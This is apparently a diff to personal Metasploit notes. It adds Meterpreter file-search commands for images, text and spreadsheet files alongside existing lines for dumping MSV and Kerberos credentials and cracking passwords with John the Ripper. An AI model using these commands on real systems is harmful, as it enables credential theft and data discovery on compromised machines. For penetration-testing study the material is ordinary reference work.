@@ -7,7 +7,15 @@ meterpreter > msv
 # dump kernberos tokens
 meterpreter > kerberos
 
+# search for files
+search -f *.jpg
+search -f *.txt
+search -f *.gif
+search -f *.xls
+search -f *.csv
+search -f *.
 
+http://www.offensive-security.com/metasploit-unleashed/Searching_For_Content
 
 use auxiliary/analyze/jtr_crack_fast
 
